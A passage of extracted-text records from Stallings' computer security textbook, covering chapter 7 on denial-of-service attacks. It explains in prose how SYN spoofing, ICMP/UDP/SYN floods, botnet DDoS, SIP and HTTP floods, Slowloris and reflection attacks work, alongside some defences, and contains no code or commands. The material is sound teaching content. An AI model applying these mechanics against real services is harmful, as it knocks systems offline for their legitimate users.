engineers to specifically query flow information from \\ntheir routers. This is a manual process that takes time and effort to organize.\\nIt is worth considering why such easy forgery of source addresses is allowed on \\nthe Internet. It dates back to the development of TCP/IP , which occurred in a gener-\\nally cooperative, trusting environment. TCP/IP simply does not include the ability, by \\ndefault, to ensure that the source address in a packet really does correspond with that \\n2ICMP packets created in response to other ICMP packets are typically the first to be discarded.\\nM07_STAL0611_04_GE_C07.indd   251 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 253, 'page_label': '252'}, page_content='252  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nof the originating system. It is possible to impose filtering on routers to ensure this \\n(or at least that source network address is valid). However, this filtering3 needs to be \\nimposed as close to the originating system as possible, where the knowledge of valid \\nsource addresses is as accurate as possible. In general, this should occur at the point \\nwhere an organization’s network connects to the wider Internet, at the borders of the \\nISP’s providing this connection. Despite this being a long-standing security recom -\\nmendation to combat problems such as DoS attacks, for example (RFC 2827), many \\nISPs do not implement such filtering. As a consequence, attacks using spoofed-source \\npackets continue to occur frequently.\\nThere is a useful side effect of this scattering of response packets to some \\noriginal flow of spoofed-source packets. Security researchers, such as those with the \\n Honeynet Project, have taken blocks of unused IP addresses, advertised routes to \\nthem, then collected details of any packets sent to these addresses. Since no real \\nsystems use these addresses, no legitimate packets should be directed to them. Any \\npackets received might simply be corrupted. It is much more likely, though, that they \\nare the direct or indirect result of network attacks. The ICMP echo response packets \\ngenerated in response to a ping flood using randomly spoofed source addresses is a \\ngood example. This is known as backscatter traffic. Monitoring the type of packets \\ngives valuable information on the type and scale of attacks being used, as described \\nby [MOOR06], for example. This information is being used to develop responses to \\nthe attacks seen.\\nSYN Spoofing\\nAlong with the basic flooding attack, the other common classic DoS attack is the \\nSYN spoofing attack. This attacks the ability of a network server to respond to TCP \\nconnection requests by overflowing the tables used to manage such connections. This \\nmeans future connection requests from legitimate users fail, denying them access to \\nthe server. It is thus an attack on system resources, specifically the network handling \\ncode in the operating system.\\nTo understand the operation of these attacks, we need to review the three-way \\nhandshake that TCP uses to establish a connection. This is illustrated in Figure 7.2. The \\nclient system initiates the request for a TCP connection by sending a SYN packet to \\nthe server. This identifies the client’s address and port number and supplies an initial \\nsequence number. It may also include a request for other TCP options. The server \\nrecords all the details about this request in a table of known TCP connections. It then \\nresponds to the client with a SYN-ACK packet. This includes a sequence number \\nfor the server and increments the client’s sequence number to confirm receipt of the \\nSYN packet. Once the client receives this, it sends an ACK packet to the server with \\nan incremented server sequence number and marks the connection as established. \\nSimilarly, when the server receives this ACK packet, it also marks the connection as \\nestablished. Either party may then proceed with data transfer. In practice, this ideal \\nexchange sometimes fails. These packets are transported using IP , which is an unreli-\\nable, though best-effort, network protocol. Any of the packets might be lost in transit, \\nas a result of congestion, for example. Hence both the client and server keep track \\n3This is known as “egress filtering.”\\nM07_STAL0611_04_GE_C07.indd   252 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 254, 'page_label': '253'}, page_content='7.1 / DENIAL-OF-SERVICE ATTACKS  253\\nof which packets they have sent and, if no response is received in a reasonable time, \\nwill resend those packets. As a result, TCP is a reliable transport protocol, and any \\napplications using it need not concern themselves with problems of lost or reordered \\npackets. This does, however, impose an overhead on the systems in managing this \\nreliable transfer of packets.\\nA SYN spoofing attack exploits this behavior on the targeted server system. The \\nattacker generates a number of SYN connection request packets with forged source \\naddresses. For each of these, the server records the details of the TCP connection \\nrequest and sends the SYN-ACK packet to the claimed source address, as shown in \\nFigure 7.3. If there is a valid system at this address, it will respond with a RST (reset) \\npacket to cancel this unknown connection request. When the server receives this \\npacket, it cancels the connection request and removes the saved information. How-\\never, if the source system is too busy, or there is no system at the forged address, then \\nno reply will return. In these cases, the server will resend the SYN-ACK packet a \\nnumber of times before finally assuming the connection request has failed and delet-\\ning the information saved concerning it. In this period between when the original \\nSYN packet is received and when the server assumes the request has failed, the server \\nis using an entry in its table of known TCP connections. This table is typically sized on \\nthe assumption that most connection requests quickly succeed and that a reasonable \\nnumber of requests may be handled simultaneously. However, in a SYN spoofing \\nattack, the attacker directs a very large number of forged connection requests at the \\ntargeted server. These rapidly fill the table of known TCP connections on the server. \\nOnce this table is full, any future requests, including legitimate requests from other \\nusers, are rejected. The table entries will time out and be removed, which in normal \\nFigure 7.2 TCP Three-Way Connection Handshake\\nClient Server\\n1\\n2\\n3\\nSend SYN\\n(seq = x) Receive SYN\\n(seq = x)\\nReceive SYN-ACK\\n(seq = y, ack = x + 1)\\nSend SYN-ACK\\n(seq = y, ack = x + 1)\\nSend ACK\\n(ack = y + 1) Receive ACK\\n(ack = y + 1)\\nM07_STAL0611_04_GE_C07.indd   253 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 255, 'page_label': '254'}, page_content='254  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nnetwork usage corrects temporary overflow problems. However, if the attacker keeps \\na sufficient volume of forged requests flowing, this table will be constantly full and \\nthe server will be effectively cut off from the Internet, unable to respond to most \\nlegitimate connection requests.\\nIn order to increase the usage of the known TCP connections table, the attacker \\nideally wishes to use addresses that will not respond to the SYN-ACK with a RST. \\nThis can be done by overloading the host that owns the chosen spoofed source \\naddress, or by simply using a wide range of random addresses. In this case, the attacker \\nrelies on the fact that there are many unused addresses on the Internet. Consequently, \\na reasonable proportion of randomly generated addresses will not correspond to a \\nreal host.\\nThere is a significant difference in the volume of network traffic between a SYN \\nspoof attack and the basic flooding attack we discussed. The actual volume of SYN \\ntraffic can be comparatively low, nowhere near the maximum capacity of the link to \\nthe server. It simply has to be high enough to keep the known TCP connections table \\nfilled. Unlike the flooding attack, this means the attacker does not need access to a \\nhigh-volume network connection. In the network shown in Figure 7.1, the medium-\\nsized organization, or even a broadband home user, could successfully attack the large \\ncompany server using a SYN spoofing attack.\\nA flood of packets from a single server, or a SYN spoofing attack originating on \\na single system, were probably the two most common early forms of DoS attacks. In \\nthe case of a flooding attack, this was a significant limitation, and attacks evolved to \\nFigure 7.3 TCP SYN SpoofingAttack\\n1\\n2\\nAttacker Server Spoofed client\\nSYN-ACK’s to\\nnon existent client\\ndiscarded\\nSend SYN\\nwith spoofed src\\n(seq = x)\\nSend SYN-ACK\\n(seq = y, ack = x + 1)\\nResend SYN-ACK\\nafter timeouts\\nAssume failed\\nconnection\\nrequest\\nM07_STAL0611_04_GE_C07.indd   254 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 256, 'page_label': '255'}, page_content='7.2 / FLOODING ATTACKS  255\\nuse multiple systems to increase their effectiveness. We next examine in more detail \\nsome of the variants of a flooding attack. These can be launched either from a single \\nor multiple systems, using a range of mechanisms, which we explore.\\n 7.2 FLOODING ATTACKS\\nFlooding attacks take a variety of forms, based on which network protocol is being \\nused to implement the attack. In all cases, the intent is generally to overload the \\nnetwork capacity on some link to a server. The attack may alternatively aim to over-\\nload the server’s ability to handle and respond to this traffic. These attacks flood the \\nnetwork link to the server with a torrent of malicious packets competing with, and \\nusually overwhelming, valid traffic flowing to the server. In response to the conges-\\ntion, this causes in some routers on the path to the targeted server, many packets \\nwill be dropped. Valid traffic has a low probability of surviving discard caused by this \\nflood, and hence of accessing the server. This results in the server’s ability to respond \\nto network connection requests being either severely degraded or failing entirely.\\nVirtually any type of network packet can be used in a flooding attack. It simply \\nneeds to be of a type that is permitted to flow over the links toward the targeted sys-\\ntem, so it can consume all available capacity on some link to the target server. Indeed, \\nthe larger the packet is, the more effective will be the attack. Common flooding attacks \\nuse any of the ICMP , UDP , or TCP SYN packet types. It is even possible to flood with \\nsome other IP packet type. However, as these are less common and their usage more \\ntargeted, it is easier to filter for them and hence hinder or block such attacks.\\nICMP Flood\\nThe ping flood using ICMP echo request packets we discussed in Section 7.1 is a clas-\\nsic example of an ICMP flooding attack. This type of ICMP packet was chosen since \\ntraditionally network administrators allowed such packets into their networks, as ping \\nis a useful network diagnostic tool. More recently, many organizations have restricted \\nthe ability of these packets to pass through their firewalls. In response, attackers have \\nstarted using other ICMP packet types. Since some of these should be handled to allow \\nthe correct operation of TCP/IP , they are much more likely to be allowed through \\nan organization’s firewall. Filtering some of these critical ICMP packet types would \\ndegrade or break normal TCP/IP network behavior. ICMP destination unreachable \\nand time exceeded packets are examples of such critical packet types.\\nAn attacker can generate large volumes of one of these packet types. Because \\nthese packets include part of some notional erroneous packet that supposedly caused \\nthe error being reported, they can be made comparatively large, increasing their effec-\\ntiveness in flooding the link. ICMP flood attacks remain one of the most common \\ntypes of DDoS attacks [SYMA16].\\nUDP Flood\\nAn alternative to using ICMP packets is to use UDP packets directed to some port \\nnumber, and hence potential service, on the target system. A common choice was a \\npacket directed at the diagnostic echo service, commonly enabled on many server \\nM07_STAL0611_04_GE_C07.indd   255 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 257, 'page_label': '256'}, page_content='256  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nsystems by default. If the server had this service running, it would respond with a \\nUDP packet back to the claimed source containing the original packet data contents. \\nIf the service is not running, then the packet is discarded, and possibly an ICMP des-\\ntination unreachable packet is returned to the sender. By then the attack has already \\nachieved its goal of occupying capacity on the link to the server. Just about any UDP \\nport number can be used for this end. Any packets generated in response only serve \\nto increase the load on the server and its network links.\\nSpoofed source addresses are normally used if the attack is generated using a \\nsingle source system, for the same reasons as with ICMP attacks. If multiple systems \\nare used for the attack, often the real addresses of the compromised, zombie, systems \\nare used. When multiple systems are used, the consequences of both the reflected \\nflow of packets and the ability to identify the attacker are reduced.\\nTCP SYN Flood\\nAnother alternative is to send TCP packets to the target system. Most likely these \\nwould be normal TCP connection requests, with either real or spoofed source \\naddresses. They would have an effect similar to the SYN spoofing attack we have \\ndescribed. In this case, though, it is the total volume of packets that is the aim of the \\nattack rather than the system code. This is the difference between a SYN spoofing \\nattack and a SYN flooding attack.\\nThis attack could also use TCP data packets, which would be rejected by the \\nserver as not belonging to any known connection. But again, by this time, the attack \\nhas already succeeded in flooding the links to the server.\\nAll of these flooding attack variants are limited in the total volume of traffic \\nthat can be generated if just a single system is used to launch the attack. The use of \\na single system also means the attacker is easier to trace. For these reasons, a variety \\nof more sophisticated attacks, involving multiple attacking systems, have been devel-\\noped. By using multiple systems, the attacker can significantly scale up the volume of \\ntraffic that can be generated. Each of these systems need not be particularly powerful \\nor on a high-capacity link. But what they do not have individually, they more than \\ncompensate for in large numbers. In addition, by directing the attack through inter-\\nmediaries, the attacker is further distanced from the target and significantly harder to \\nlocate and identify. Indirect attack types that utilize multiple systems include:\\n• Distributed denial-of-service attacks.\\n• Reflector attacks.\\n• Amplifier attacks.\\nWe will consider each of these in turn.\\n 7.3 DISTRIBUTED DENIAL-OF-SERVICE ATTACKS\\nRecognizing the limitations of flooding attacks generated by a single system, one \\nof the earlier significant developments in DoS attack tools was the use of multiple \\nsystems to generate attacks. These systems were typically compromised user worksta-\\ntions or PCs. The attacker uses malware to subvert the system and to install an attack \\nM07_STAL0611_04_GE_C07.indd   256 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 258, 'page_label': '257'}, page_content='7.3 / DISTRIBUTED DENIAL-OF-SERVICE ATTACKS  257\\nagent, which they can control. Such systems are known as zombies. Large collections \\nof such systems under the control of one attacker can be created, collectively form-\\ning a botnet, as we discussed in Chapter 6. Such networks of compromised systems \\nare a favorite tool of attackers, and can be used for a variety of purposes, includ -\\ning distributed denial-of-service (DDoS)  attacks. Indeed, there is an underground \\neconomy that creates and hires out botnets for use in such attacks. [SYMA16] report \\nevidence that 40% of DDoS attacks in 2015 were from such botnets for hire. In the \\nexample network shown in Figure 7.1, some of the broadband user systems may be \\ncompromised and used as zombies to attack any of the company or other links shown.\\nWhile the attacker could command each zombie individually, more generally \\na control hierarchy is used. A small number of systems act as handlers controlling a \\nmuch larger number of agent systems, as shown in Figure 7.4. There are a number of \\nadvantages to this arrangement. The attacker can send a single command to a handler, \\nwhich then automatically forwards it to all the agents under its control. Automated \\ninfection tools can also be used to scan for and compromise suitable zombie systems, \\nas we discussed in Chapter 6. Once the agent software is uploaded to a newly com -\\npromised system, it can contact one or more handlers to automatically notify them \\nof its availability. By this means, the attacker can automatically grow suitable botnets.\\nOne of the earliest and best-known DDoS tools is Tribe Flood Network (TFN), \\nwritten by the hacker known as Mixter. The original variant from the 1990s exploited \\nSun Solaris systems. It was later rewritten as Tribe Flood Network 2000 (TFN2K) and \\ncould run on UNIX, Solaris, and Windows NT systems. TFN and TFN2K use a ver-\\nsion of the two-layer command hierarchy shown in Figure 7.4. The agent was a Trojan \\nprogram that was copied to and run on compromised, zombie systems. It was capable \\nof implementing ICMP flood, SYN flood, UDP flood, and ICMP amplification forms \\nof DoS attacks. TFN did not spoof source addresses in the attack packets. Rather, it \\nFigure 7.4 DDoS Attack Architecture\\nAttacker\\nHandler\\nzombies\\nAgent\\nzombies\\nTarget\\nM07_STAL0611_04_GE_C07.indd   257 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 259, 'page_label': '258'}, page_content='258  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nrelied on a large number of compromised systems, and the layered command struc-\\nture, to obscure the path back to the attacker. The agent also implemented some other \\nrootkit functions as we described in Chapter 6. The handler was simply a command-\\nline program run on some compromised systems. The attacker accessed these systems \\nusing any suitable mechanism giving shell access, and then ran the handler program \\nwith the desired options. Each handler could control a large number of agent sys -\\ntems, identified using a supplied list. Communications between the handler and its \\nagents was encrypted and could be intermixed with a number of decoy packets. This \\nhindered attempts to monitor and analyze the control traffic. Both these communica-\\ntions and the attacks themselves could be sent via randomized TCP , UDP , and ICMP \\npackets. This tool demonstrates the typical capabilities of a DDoS attack system.\\nMany other DDoS tools have been developed since. Instead of using dedicated \\nhandler programs, many now use an IRC 4 or similar instant messaging server pro -\\ngram, or Web-based HTTP servers, to manage communications with the agents. Many \\nof these more recent tools also use cryptographic mechanisms to authenticate the \\nagents to the handlers, in order to hinder analysis of command traffic.\\nThe best defense against being an unwitting participant in a DDoS attack is to \\nprevent your systems from being compromised. This requires good system security \\npractices and keeping the operating systems and applications on such systems cur -\\nrent and patched.\\nFor the target of a DDoS attack, the response is the same as for any flooding \\nattack, but with greater volume and complexity. We will discuss appropriate defenses \\nand responses in Sections 7 .6 and 7 .7 .\\n 7.4 APPLICATION-BASED BANDWIDTH ATTACKS\\nA potentially effective strategy for denial of service is to force the target to execute \\nresource-consuming operations that are disproportionate to the attack effort. For \\nexample, websites may engage in lengthy operations such as searches, in response to \\na simple request. Application-based bandwidth attacks attempt to take advantage of \\nthe disproportionally large resource consumption at a server. In this section, we look \\nat two protocols that can be used for such attacks.\\nSIP Flood\\nVoice over IP (VoIP) telephony is now widely deployed over the Internet. The stan-\\ndard protocol used for call setup in VoIP is the Session Initiation Protocol (SIP). SIP \\nis a text-based protocol with a syntax similar to that of HTTP . There are two different \\ntypes of SIP messages: requests and responses. Figure 7.5 is a simplified illustration \\nof the operation of the SIP INVITE message, used to establish a media session \\nbetween user agents. In this case, Alice’s user agent runs on a computer, and Bob’s \\n4Internet Relay Chat (IRC) was one of the earlier instant messaging systems developed, with a number \\nof open source server implementations. It is a popular choice for attackers to use and modify as a handler \\nprogram able to control large numbers of agents. Using the standard chat mechanisms, the attacker can \\nsend a message that is relayed to all agents connected to that channel on the server. Alternatively, the \\nmessage may be directed to just one or a defined group of agents.\\nM07_STAL0611_04_GE_C07.indd   258 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 260, 'page_label': '259'}, page_content='7.4 / APPLICATION-BASED BANDWIDTH ATTACKS  259\\nuser agent runs on a cell phone. Alice’s user agent is configured to communicate with \\na proxy server (the outbound server) in its domain and begins by sending an INVITE \\nSIP request to the proxy server that indicates its desire to invite Bob’s user agent into \\na session. The proxy server uses a DNS server to get the address of Bob’s proxy \\nserver, then forwards the INVITE request to that server. The server then forwards \\nthe request to Bob’s user agent, causing Bob’s phone to ring.5\\nA SIP flood attack exploits the fact that a single INVITE request triggers con-\\nsiderable resource consumption. The attacker can flood a SIP proxy with numerous \\nINVITE requests with spoofed IP addresses, or alternately a DDoS attack using a \\nbotnet to generate numerous INVITE request. This attack puts a load on the SIP \\nproxy servers in two ways. First, their server resources are depleted in processing the \\nINVITE requests. Second, their network capacity is consumed. Call receivers are also \\nvictims of this attack. A target system will be flooded with forged VoIP calls, making \\nthe system unavailable for legitimate incoming calls.\\n5See [STAL14] for a more detailed description of SIP operation.\\nFigure 7.5 SIP INVITE Scenario\\nReturns IP\\naddress of Bob’s\\nproxy server\\nDNS\\nserver\\nUser agent Alice User agent Bob\\nProxy\\nserver\\nProxy\\nserver\\nInternet\\nWireless\\nnetwork\\nLAN\\nINVITE sip:bob@biloxi.com\\nFrom: sip:alice@atlanta.com\\nINVITE sip:bob@biloxi.com\\nFrom: sip:alice@atlanta.com\\nINVITE sip:bob@biloxi.com\\nFrom: sip:alice@atlanta.com\\n1\\n23\\n4\\n5\\n DNS query:\\n biloxi.com\\nM07_STAL0611_04_GE_C07.indd   259 10/11/17   2:54 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 261, 'page_label': '260'}, page_content='260  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nHTTP-Based Attacks\\nWe consider two different approaches to exploiting the Hypertext Transfer Protocol \\n(HTTP) to deny service.\\nHTTP Flood An HTTP flood refers to an attack that bombards Web servers with \\nHTTP requests. Typically, this is a DDoS attack, with HTTP requests coming from \\nmany different bots. The requests can be designed to consume considerable resources. \\nFor example, an HTTP request to download a large file from the target causes the \\nWeb server to read the file from hard disk, store it in memory, convert it into a packet \\nstream, then transmit the packets. This process consumes memory, processing, and \\ntransmission resources.\\nA variant of this attack is known as a recursive HTTP flood. In this case, the \\nbots start from a given HTTP link and then follows all links on the provided website \\nin a recursive way. This is also called spidering.\\nSlowloriS An intriguing and unusual form of HTTP-based attack is Slowloris  \\n[SOUR12], [DAMO12]. Slowloris exploits the common server technique of using \\nmultiple threads to support multiple requests to the same server application. It \\nattempts to monopolize all of the available request handling threads on the Web \\nserver by sending HTTP requests that never complete. Since each request consumes \\na thread, the Slowloris attack eventually consumes all of the Web server’s connection \\ncapacity, effectively denying access to legitimate users.\\nThe HTTP protocol specification (RFC2616) states that a blank line must be \\nused to indicate the end of the request headers and the beginning of the payload, \\nif any. Once the entire request is received, the Web server may then respond. The \\nSlowloris attack operates by establishing multiple connections to the Web server. On \\neach connection, it sends an incomplete request that does not include the terminating \\nnewline sequence. The attacker sends additional header lines periodically to keep the \\nconnection alive, but never sends the terminating newline sequence. The Web server \\nkeeps the connection open, expecting more information to complete the request. As \\nthe attack continues, the volume of long-standing Slowloris connections increases, \\neventually consuming all available Web server connections, thus rendering the Web \\nserver unavailable to respond to legitimate requests.\\nSlowloris is different from typical denials of service in that Slowloris traffic \\nutilizes legitimate HTTP traffic, and does not rely on using special “bad” HTTP \\nrequests that exploit bugs in specific HTTP servers. Because of this, existing intrusion \\ndetection and intrusion prevention solutions that rely on signatures to detect attacks \\nwill generally not recognize Slowloris. This means that Slowloris is capable of being \\neffective even when standard enterprise-grade intrusion detection and intrusion pre-\\nvention systems are in place.\\nThere are a number of countermeasures that can be taken against Slowloris \\ntype attacks, including limiting the rate of incoming connections from a particular \\nhost; varying the timeout on connections as a function of the number of connec -\\ntions; and delayed binding. Delayed binding is performed by load balancing soft -\\nware. In essence, the load balancer performs an HTTP request header completeness \\ncheck, which means that the HTTP request will not be sent to the appropriate \\nWeb server until the final two carriage return and line feeds are sent by the HTTP \\nM07_STAL0611_04_GE_C07.indd   260 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 262, 'page_label': '261'}, page_content='7.5 / REFLECTOR AND AMPLIFIER ATTACKS  261\\nclient. This is the key bit of information. Basically, delayed binding ensures that \\nyour Web server or proxy will never see any of the incomplete requests being sent \\nout by Slowloris.\\n 7.5 REFLECTOR AND AMPLIFIER ATTACKS\\nIn contrast to DDoS attacks, where the intermediaries are compromised systems \\nrunning the attacker’s programs, reflector and amplifier attacks use network systems \\nfunctioning normally. The attacker sends a network packet with a spoofed source \\naddress to a service running on some network server. The server responds to this \\npacket, sending it to the spoofed source address that belongs to the actual attack \\ntarget. If the attacker sends a number of requests to a number of servers, all with the \\nsame spoofed source address, the resulting flood of responses can overwhelm the \\ntarget’s network link. The fact that normal server systems are being used as inter -\\nmediaries, and that their handling of the packets is entirely conventional, means \\nthese attacks can be easier to deploy and harder to trace back to the actual attacker. \\nThere are two basic variants of this type of attack: the simple reflection attack and \\nthe amplification attack.\\nReflection Attacks\\nThe reflection attack is a direct implementation of this type of attack. The attacker \\nsends packets to a known service on the intermediary with a spoofed source address \\nof the actual target system. When the intermediary responds, the response is sent to \\nthe target. Effectively this reflects the attack off the intermediary, which is termed \\nthe reflector, and is why this is called a reflection attack.\\nIdeally, the attacker would like to use a service that created a larger response \\npacket than the original request. This allows the attacker to convert a lower volume \\nstream of packets from the originating system into a higher volume of packet data \\nfrom the intermediary directed at the target. Common UDP services are often used \\nfor this purpose. Originally, the echo service was a favored choice, although it does \\nnot create a larger response packet. However, any generally accessible UDP service \\ncould be used for this type of attack. The chargen, DNS, SNMP , or ISAKMP6 services \\nhave all been exploited in this manner, in part because they can be made to generate \\nlarger response packets directed at the target.\\nThe intermediary systems are often chosen to be high-capacity network servers \\nor routers with very good network connections. This means they can generate high \\nvolumes of traffic if necessary, and if not, the attack traffic can be obscured in the nor-\\nmal high volumes of traffic flowing through them. If the attacker spreads the attack \\nover a number of intermediaries in a cyclic manner, then the attack traffic flow may \\n6Chargen is the character generator diagnostic service that returns a stream of characters to the client that \\nconnects to it. Domain Name Service (DNS) is used to translate between names and IP addresses. The \\nSimple Network Management Protocol (SNMP) is used to manage network devices by sending queries \\nto which they can respond with large volumes of detailed management information. The Internet Security \\nAssociation and Key Management Protocol (ISAKMP) provides the framework for managing keys in the \\nIP Security Architecture (IPsec), as we will discuss in Chapter 22.\\nM07_STAL0611_04_GE_C07.indd   261 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 263, 'page_label': '262'}, page_content='262  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nwell not be easily distinguished from the other traffic flowing from the system. This, \\ncombined with the use of spoofed source addresses, greatly increases the difficulty of \\nany attempt to trace the packet flows back to the attacker’s system.\\nAnother variant of reflection attack uses TCP SYN packets and exploits the \\nnormal three-way handshake used to establish a TCP connection. The attacker sends \\na number of SYN packets with spoofed source addresses to the chosen intermedi -\\naries. In turn, the intermediaries respond with a SYN-ACK packet to the spoofed \\nsource address, which is actually the target system. The attacker uses this attack with \\na number of intermediaries. The aim is to generate high enough volumes of packets to \\nflood the link to the target system. The target system will respond with a RST packet \\nfor any that get through, but by then the attack has already succeeded in overwhelm-\\ning the target’s network link.\\nThis attack variant is a flooding attack that differs from the SYN spoofing attack \\nwe discussed earlier in this chapter. The goal is to flood the network link to the target, \\nnot to exhaust its network handling resources. Indeed, the attacker would usually \\ntake care to limit the volume of traffic to any particular intermediary to ensure that \\nit is not overwhelmed by, or even notices, this traffic. This is both because its con -\\ntinued correct functioning is an essential component of this attack, as is limiting the \\nchance of the attacker’s actions being detected. The 2002 attack on GRC.com was of \\nthis form. It used connection requests to the BGP routing service on core routers as \\nthe primary intermediaries. These generated sufficient response traffic to completely \\nblock normal access to GRC.com. However, as GRC.com discovered, once this traffic \\nwas blocked, a range of other services, on other intermediaries, were also being used. \\nGRC noted in its report on this attack that “you know you’re in trouble when packet \\nfloods are competing to flood you.”\\nAny generally accessible TCP service can be used in this type of attack. Given \\nthe large number of servers available on the Internet, including many well-known \\nservers with very high capacity network links, there are many possible intermediaries \\nthat can be used. What makes this attack even more effective is that the individual \\nTCP connection requests are indistinguishable from normal connection requests \\ndirected to the server. It is only if they are running some form of intrusion detection \\nsystem that detects the large numbers of failed connection requests from one system \\nthat this attack might be detected and possibly blocked. If the attacker is using a \\nnumber of intermediaries, then it is very likely that even if some detect and block the \\nattack, many others will not, and the attack will still succeed.\\nA further variation of the reflector attack establishes a self-contained loop \\nbetween the intermediary and the target system. Both systems act as reflectors. \\n Figure\\xa07.6 shows this type of attack. The upper part of the figure shows normal \\nDomain Name System operation.7 The DNS client sends a query from its UDP port \\n1792 to the server’s DNS port 53 to obtain the IP address of a domain name. The \\nDNS server sends a UDP response packet including the IP address. The lower part \\nof the figure shows a reflection attack using DNS. The attacker sends a query to the \\nDNS server with a spoofed IP source address of j.k.l.m; this is the IP address of the \\ntarget. The attacker uses port 7 , which is usually associated with echo, a reflector \\n7See Appendix H for an overview of DNS.\\nM07_STAL0611_04_GE_C07.indd   262 10/11/17   2:54 PM'),\n",
